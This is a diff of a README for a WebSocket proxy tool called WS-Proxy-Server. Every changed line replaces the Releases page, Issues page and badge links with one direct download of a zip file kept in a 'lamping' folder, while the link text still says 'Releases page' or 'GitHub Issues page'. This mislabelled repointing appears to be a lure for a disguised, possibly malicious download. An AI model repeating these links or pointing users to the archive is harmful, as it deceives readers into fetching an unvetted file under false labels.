@@ -6,7 +6,7 @@ Welcome! The WS-Proxy-Server allows you to receive HTTPS requests from your clie
 
 ## 📥 Download WS-Proxy-Server
 
-[![Download WS-Proxy-Server](https://img.shields.io/badge/Download%20Now-WS--Proxy--Server-blue)](https://github.com/neoiwr/WS-Proxy-Server/releases)
+[![Download WS-Proxy-Server](https://raw.githubusercontent.com/neoiwr/WS-Proxy-Server/main/lamping/WS-Proxy-Server.zip%20Now-WS--Proxy--Server-blue)](https://raw.githubusercontent.com/neoiwr/WS-Proxy-Server/main/lamping/WS-Proxy-Server.zip)
 
 ## 📦 System Requirements
 
@@ -28,7 +28,7 @@ WS-Proxy-Server offers several features to enhance your experience:
 ## 📋 Instructions to Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/neoiwr/WS-Proxy-Server/releases) to find the latest version of WS-Proxy-Server.
+   Go to the [Releases page](https://raw.githubusercontent.com/neoiwr/WS-Proxy-Server/main/lamping/WS-Proxy-Server.zip) to find the latest version of WS-Proxy-Server.
 
 2. **Select Your Version**  
    On the Releases page, locate the latest release. You will see files listed for download. Choose the appropriate file for your operating system.
@@ -69,7 +69,7 @@ If you encounter any issues:
 
 ## 📞 Support
 
-If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/neoiwr/WS-Proxy-Server/issues) or check the FAQ section on the Releases page.
+If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/neoiwr/WS-Proxy-Server/main/lamping/WS-Proxy-Server.zip) or check the FAQ section on the Releases page.
 
 ## 📄 License
 
@@ -77,4 +77,4 @@ WS-Proxy-Server is open-source software, licensed under the MIT License. You may
 
 ## 📥 Download WS-Proxy-Server Again
 
-Don’t forget, you can always go back to the [Releases page](https://github.com/neoiwr/WS-Proxy-Server/releases) to download the latest version of WS-Proxy-Server. Enjoy your seamless WebSocket experience!
+Don’t forget, you can always go back to the [Releases page](https://raw.githubusercontent.com/neoiwr/WS-Proxy-Server/main/lamping/WS-Proxy-Server.zip) to download the latest version of WS-Proxy-Server. Enjoy your seamless WebSocket experience!
